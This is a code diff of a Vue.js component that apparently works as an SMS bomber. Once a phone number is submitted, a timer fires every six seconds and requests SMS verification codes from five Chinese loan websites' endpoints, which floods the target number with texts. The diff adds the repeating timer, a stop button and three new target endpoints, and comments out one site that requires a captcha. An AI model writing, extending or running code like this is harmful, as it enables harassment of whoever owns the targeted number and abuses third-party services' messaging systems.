@@ -12,6 +12,7 @@
         </div>
         <div class="button">
           <a class="gv" href="javascript:;" @click="submit">发送</a>
+          <a class="gv" href="javascript:;" @click="stop">停止</a>
           <!--<img src="https://www.xiaodaiba.cn/registerVerify.htm?0.36112539871392557" style="width: 150px;height: 50px;" alt="">-->
         </div>
       </form>
@@ -21,13 +22,14 @@
 
 <script>
 
-
+  var qs = require('qs')
   export default {
     data() {
       return {
         dialog: false,
         dialogMsg: '',
-        mobile:''
+        mobile:'',
+        strokeTime:''
       }
     },
     methods: {
@@ -37,13 +39,24 @@
       back() {
         this.$emit('back')
       },
-      submit:function () {
-        console.log(this.mobile);
-        this.bapin()
-//        this.fengtai()
-        this.xiaodaiwang()
+      stop(){
+        clearInterval(this.strokeTime)
       },
-      //小贷网
+      submit:function () {
+        this.strokeTime=setInterval(()=>{
+          this.stroke()
+        },6000)
+      },
+      stroke(){
+        this.bapin()
+        this.fengtai()
+        this.dingguagua()
+        this.jiguang()
+        this.huosu()
+        //需要验证码
+//        this.xiaodaiwang()
+      },
+      //小贷网(需要验证码)
       xiaodaiwang(){
         this.axios({
           method:'get',
@@ -60,20 +73,55 @@
           url:"/bapin/index.php/Home/Tools/sendVerifyCode?phone="+this.mobile+"&type=1"
         })
       },
-      //丰泰
-      fengtai(){
+      //极光贷
+      jiguang(){
         this.axios({
           method:'post',
-          url:"http://dk.myzcgl.top/duanxi/sms.php",
-          ContentType:'application/x-www-form-urlencoded; charset=UTF-8',
+          url:"/jiguang/app/open/channelUser/getCode",
           data:{
-            mobile:this.mobile,
-            send_code:1111
+            channelId: "13",
+            mobile:this.mobile
           }
-        }).then(res=>{
-          console.log(res.data);
-        }).catch(err=>{
-          console.log(err);
+        })
+      },
+      //火速花花
+      huosu(){
+        let data={
+          p:'sqNxtlDM2ErTNHgAqADh4yPZqpXeC3',
+          userPhone:this.mobile,
+          channel:'hsxcdk',
+          verify:'',
+          title: '火速花花'
+        }
+        this.axios({
+          method:'post',
+          url:"/huosu/landing/code",
+          headers: {
+            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
+          },
+          data:qs.stringify(data)
+        })
+      },
+      //顶呱呱
+      dingguagua(){
+        this.axios({
+          method:'get',
+          url:"/dingguagua/api/get_sms_code2do?callback=flightHandler&tel="+this.mobile+"&_=1543809103344"
+        })
+      },
+      //丰泰
+      fengtai(){
+        let data={
+          mobile:parseInt(this.mobile),
+          send_code:1111
+        }
+        this.axios({
+          method:'post',
+          url:"/fengtai/duanxi/sms.php",
+          headers: {
+            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
+          },
+          data:qs.stringify(data)
         })
       },
 
